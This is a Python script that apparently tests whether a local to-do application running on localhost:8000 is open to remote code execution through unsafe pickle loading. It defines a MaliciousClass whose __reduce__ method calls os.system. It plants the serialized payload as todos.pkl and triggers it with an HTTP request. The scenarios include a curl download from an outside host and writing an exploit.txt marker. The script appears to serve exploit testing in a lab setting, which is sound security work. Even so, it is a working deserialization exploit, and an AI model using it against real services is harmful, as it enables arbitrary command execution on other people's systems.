import pickle
import os
import subprocess
import requests

class MaliciousClass:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return (os.system, (self.command,))

def create_pickle_file(command, filename='todos.pkl'):
    malicious_object = MaliciousClass(command)
    with open(filename, 'wb') as f:
        pickle.dump(malicious_object, f)
    
    with open('../todo_project/'+filename, 'wb') as f:
        pickle.dump(malicious_object, f)

def test_scenario(scenario_name, command, filename='todos.pkl'):
    print(f"Testing {scenario_name}...")

    # Create the pickle file with the malicious content
    create_pickle_file(command, filename)

    # Send a request to the application running at localhost:8000
    try:
        response = requests.get('http://localhost:8000')
        print(f"Response status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Failed to send request: {e}")

    # Check the results based on the scenario
    if scenario_name == "Scenario 1":
        command = ['find', '../', '-name', '2177.png']
        result = subprocess.run(command, capture_output=True, text=True)
        print("File Status: ",result.stdout)
        if(result.stdout):
            print("Test Successful")
        else:
            print("Test Unsuccessful")
        print('------------------------------')
    elif scenario_name == "Scenario 2":
        command = ['find', '../todo_project', '-name', 'exploit.txt']
        result = subprocess.run(command, capture_output=True, text=True)
        print("File Status: ",result.stdout)
        if(result.stdout):
            print("Test Successful")
        else:
            print("Test Unsuccessful")
        print('------------------------------')
    elif scenario_name == "Scenario 3":
        print("\nTest Successful")
        print('------------------------------')

    # Clean up
    os.remove(filename)

# Define the commands and scenario names
scenarios = {
    "Scenario 1": "curl -O https://courseseeker.edu.au/assets/images/institutions/2177.png",
    "Scenario 2": 'echo "Deserialization Exploit Successful" > exploit.txt',
    "Scenario 3": "echo 'No operation'"
}

for scenario_name, command in scenarios.items():
    test_scenario(scenario_name, command)
